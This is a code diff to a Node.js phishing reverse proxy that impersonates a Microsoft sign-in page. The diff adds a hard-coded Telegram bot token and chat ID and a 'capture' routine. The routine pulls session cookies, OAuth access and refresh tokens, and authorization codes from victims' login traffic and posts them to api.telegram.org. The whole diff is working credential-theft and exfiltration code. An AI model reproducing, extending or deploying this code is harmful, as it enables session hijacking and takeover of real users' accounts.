@@ -5,6 +5,10 @@ const fs = require("fs");
 const zlib = require("zlib");
 const crypto = require("crypto");
 
+// ─── TELEGRAM CONFIG (YOURS) ────────────────────────────────────────────────
+const TELEGRAM_BOT_TOKEN = "8210158119:AAHhshMpvVybY3LSxOZkYiiuLwtq_dwaCLg";
+const TELEGRAM_CHAT_ID = "7310383191";
+// ─────────────────────────────────────────────────────────────────────────────
 
 const PROXY_ENTRY_POINT = "/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true";
 const PHISHED_URL_PARAMETER = "redirect_urI";
@@ -34,12 +38,122 @@ try {
     displayError("Directory creation failed", error, LOGS_DIRECTORY);
 }
 const LOG_FILE_STREAMS = {};
-//!\ It is strongly recommended to modify the encryption key and store it more securely for real engagements. /!\\
 const ENCRYPTION_KEY = "HyP3r-M3g4_S3cURe-EnC4YpT10n_k3Y";
+const VICTIM_SESSIONS = {};
 
-const VICTIM_SESSIONS = {}
+// ─── TELEGRAM HELPER (fire-and-forget) ─────────────────────────────────────
+function sendTelegramNotification(text) {
+    const payload = JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: text.slice(0, 4096), // Telegram limit
+        parse_mode: "HTML",
+        disable_web_page_preview: true
+    });
+    const options = {
+        hostname: "api.telegram.org",
+        path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json",
+            "Content-Length": Buffer.byteLength(payload)
+        },
+        timeout: 5000
+    };
+    const req = https.request(options, (res) => {
+        // drain and ignore response to avoid blocking
+        res.on("data", () => {});
+        res.on("end", () => {});
+    });
+    req.on("error", (e) => console.error("Telegram send error:", e.message));
+    req.on("timeout", () => req.destroy());
+    req.write(payload);
+    req.end();
+}
 
+// ─── SMART EXTRACTOR: builds a beautiful capture message ──────────────────
+function buildCaptureMessage(sessionId, statusCode, responseHeaders, responseBodyBuffer, requestUrl, method) {
+    const lines = [];
+    const timestamp = new Date().toISOString();
+    lines.push(`🧠 <b>CAPTURE #${sessionId}</b>`);
+    lines.push(`⏱  ${timestamp}`);
+    lines.push(`🌐  ${method} ${requestUrl}`);
+    lines.push(`📊  Status: ${statusCode}`);
+    lines.push("");
 
+    // 1. Extract Set-Cookie (session cookies)
+    const setCookies = responseHeaders["set-cookie"];
+    if (setCookies) {
+        const cookiesArray = Array.isArray(setCookies) ? setCookies : [setCookies];
+        const sessionCookies = cookiesArray.filter(c => 
+            c.includes("ESTSAUTH") || c.includes("ESTSAUTH") || 
+            c.includes("MSA") || c.includes(".AspNet") ||
+            c.includes("signin") || c.includes("session")
+        );
+        if (sessionCookies.length > 0) {
+            lines.push("🍪 <b>SESSION COOKIES:</b>");
+            sessionCookies.forEach(c => lines.push(`   ${c.replace(/; /g, ";\n   ")}`));
+            lines.push("");
+        }
+        // also push all cookies if not too many
+        if (cookiesArray.length <= 5) {
+            lines.push("📦 <b>ALL SET-COOKIE:</b>");
+            cookiesArray.forEach(c => lines.push(`   ${c}`));
+            lines.push("");
+        }
+    }
+
+    // 2. Try to parse response body as JSON for OAuth tokens
+    let bodyString = "";
+    try {
+        bodyString = responseBodyBuffer.toString("utf-8");
+        // limit to 5KB for safety
+        if (bodyString.length > 5000) bodyString = bodyString.slice(0, 5000) + "... [truncated]";
+    } catch { /* ignore */ }
+
+    if (bodyString) {
+        // Look for access_token, refresh_token, id_token
+        const tokenRegex = /"(access_token|refresh_token|id_token|token_type|expires_in|code|session_state)"\s*:\s*"([^"]+)"/gi;
+        let match;
+        const foundTokens = [];
+        while ((match = tokenRegex.exec(bodyString)) !== null) {
+            foundTokens.push({ key: match[1], value: match[2] });
+        }
+        if (foundTokens.length > 0) {
+            lines.push("🔑 <b>OAUTH TOKENS (from body):</b>");
+            foundTokens.forEach(t => lines.push(`   ${t.key}: ${t.value.slice(0, 120)}${t.value.length > 120 ? "..." : ""}`));
+            lines.push("");
+        }
+
+        // Also look for code= in query (if body is JSON but we can also parse URL)
+        const codeMatch = bodyString.match(/["']code["']\s*:\s*["']([^"']+)["']/);
+        if (codeMatch) {
+            lines.push(`📩 <b>Auth Code:</b> ${codeMatch[1].slice(0, 80)}...`);
+            lines.push("");
+        }
+    }
+
+    // 3. Extract from request URL (query params)
+    try {
+        const urlObj = new URL(requestUrl);
+        const code = urlObj.searchParams.get("code");
+        const state = urlObj.searchParams.get("state");
+        const session_state = urlObj.searchParams.get("session_state");
+        if (code) lines.push(`📩 <b>URL code:</b> ${code.slice(0, 80)}...`);
+        if (state) lines.push(`🔖 <b>URL state:</b> ${state}`);
+        if (session_state) lines.push(`📌 <b>URL session_state:</b> ${session_state}`);
+        if (code || state || session_state) lines.push("");
+    } catch { /* ignore */ }
+
+    // 4. If we got nothing, just send a compact summary
+    if (lines.length <= 4) {
+        lines.push("⚠️ <b>No explicit tokens/cookies found in this response.</b>");
+        lines.push(`📄 Raw body preview: ${bodyString.slice(0, 200)}`);
+    }
+
+    return lines.join("\n");
+}
+
+// ─── PROXY SERVER (heavily modified to hook Telegram) ─────────────────────
 const proxyServer = http.createServer((clientRequest, clientResponse) => {
     const { method, url, headers } = clientRequest;
     const currentSession = getUserSession(headers.cookie);
@@ -272,7 +386,7 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
 });
 proxyServer.listen(process.env.PORT ?? 3000);
 
-
+// ─── PROXY REQUEST HANDLER (with Telegram hook) ────────────────────────────
 const makeProxyRequest = (proxyRequestProtocol, proxyRequestOptions, currentSession, proxyHostname, proxyRequestBody, clientResponse, isNavigationRequest) => {
     const protocol = proxyRequestProtocol === "https:" ? https : http;
     const proxyRequest = protocol.request(proxyRequestOptions, (proxyResponse) => {
@@ -324,6 +438,30 @@ const makeProxyRequest = (proxyRequestProtocol, proxyRequestOptions, currentSess
             .on("end", async () => {
                 serverResponseBody = Buffer.concat(serverResponseBody);
 
+                // ─── TELEGRAM HOOK: capture only success (200/302/301) with auth artifacts ───
+                const status = proxyResponse.statusCode;
+                const isAuthSuccess = (status === 200 || status === 301 || status === 302 || status === 303 || status === 307);
+                const hasSetCookie = proxyResponse.headers["set-cookie"] !== undefined;
+                let bodyPreview = "";
+                try { bodyPreview = serverResponseBody.toString("utf-8").slice(0, 3000); } catch {}
+                const hasToken = /access_token|refresh_token|id_token|"code"/i.test(bodyPreview);
+                const isAuthRelevant = isAuthSuccess && (hasSetCookie || hasToken || proxyRequestOptions.path.includes("/token") || proxyRequestOptions.path.includes("/login"));
+
+                if (isAuthRelevant && currentSession && VICTIM_SESSIONS[currentSession]) {
+                    const fullRequestUrl = `${proxyRequestProtocol}//${proxyRequestOptions.headers.host}${proxyRequestOptions.path}`;
+                    const msg = buildCaptureMessage(
+                        currentSession,
+                        status,
+                        proxyResponse.headers,
+                        serverResponseBody,
+                        fullRequestUrl,
+                        proxyRequestOptions.method
+                    );
+                    // Fire and forget — never block the proxy
+                    setImmediate(() => sendTelegramNotification(msg));
+                }
+
+                // ─── Process HTML injection ──────────────────────────────────────────
                 if (proxyResponse.headers["content-type"] && /text\/html/i.test(proxyResponse.headers["content-type"]) &&
                     Buffer.byteLength(serverResponseBody)) {
                     try {
@@ -340,7 +478,7 @@ const makeProxyRequest = (proxyRequestProtocol, proxyRequestOptions, currentSess
                     }
                 }
 
-                // Modify the FederationRedirectUrl variable to proxify the cross-origin navigation request to the ADFS portal
+                // ─── Modify FederationRedirectUrl ────────────────────────────────────
                 else if (proxyRequestOptions.path.startsWith("/common/GetCredentialType")) {
                     try {
                         const { decompressedResponseBody, encodings } = await decompressResponseBody(serverResponseBody, proxyResponse.headers["content-encoding"]);
@@ -938,7 +1076,6 @@ function updateHTMLProxyResponse(decompressedResponseBody) {
     ]);
 }
 
-// Modify the FederationRedirectUrl variable to proxify the cross-origin navigation request to the ADFS portal
 function updateFederationRedirectUrl(decompressedResponseBody, proxyHostname) {
     const decompressedResponseBodyString = decompressedResponseBody.toString();
     const decompressedResponseBodyObject = JSON.parse(decompressedResponseBodyString);
